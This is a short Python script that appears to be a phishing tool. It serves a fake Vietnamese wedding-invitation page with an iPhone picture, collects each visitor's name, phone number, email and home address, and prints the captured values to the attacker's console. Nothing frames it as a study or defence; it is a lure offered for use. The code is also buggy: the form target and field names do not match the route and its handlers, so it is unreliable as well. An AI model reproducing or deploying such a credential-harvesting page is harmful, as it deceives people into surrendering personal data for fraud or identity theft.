import socket
import sys
from flask import Flask, render_template, request

IP = '192.168.1.18'
PORT = 443

def handler():
	session = True
	while True:
		handler_inet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		handler_inet.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		handler_inet.bind((IP, PORT))
		handler_inet.listen(2)

		print(f"[+] Start Handler On ( http://{IP}:{PORT}/ )...")
		handler_connect, handler_address = handler_inet.accept()

		files_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>hello word</title>
    <img src="https://cdn.tgdd.vn/Products/Images/42/114115/iphone-x-64gb-hh-600x600.jpg" width="200" height="200">
</head>
<body>
    <h1>xin Chao</h1>
    <h1>thiệp mời đám cưới</h1>
    <p>đường Hoàng Liên</p>
    <form action="/login" method="POST">
        <label for="usr">Họ Tên: </label>
        <input type="text" id="name" name="name" required><br>

        <body></body>

        <label for="sdt">Số Điện Thoại: </label>
        <input type="text" id="sdt" name="sdt" required><br>

        <body></body>

        <label for="mail">Email: </label>
        <input type="text" name="emali" required><br>

        <body></body>

        <label for="address">Địa Chỉ Nhà: </label>
        <input type="text" id="addr" name="addr" required><br>

        <input type="submit" value="Send"> 

    </form>
</body>
</html>"""

		response = "HTTP/1.1 200 OK\r\n\r\n" + files_html
		handler_connect.sendall(response.encode())

		print(f"[+] One REQUESTS From {handler_address}...")

		app = Flask(__name__)

		@app.route('/')
		def home():
			return render_template('index.html')

		@app.route('/index', methods=['POST'])
		def log():
			usr = request.form('usr')
			sdt = request.form('sdt')
			mail = request.form('mail')
			address = request.form('address')

			print(f"[+] Username : {usr}")
			print(f"[+] phone : {sdt}")
			print(f"[+] Mail : {mail}")
			print(f"[+] Address : {address}")

			return "Logup Success"

		if __name__ == "__main__":
			app.run(host=f"{IP}", port=int(PORT))

handler()
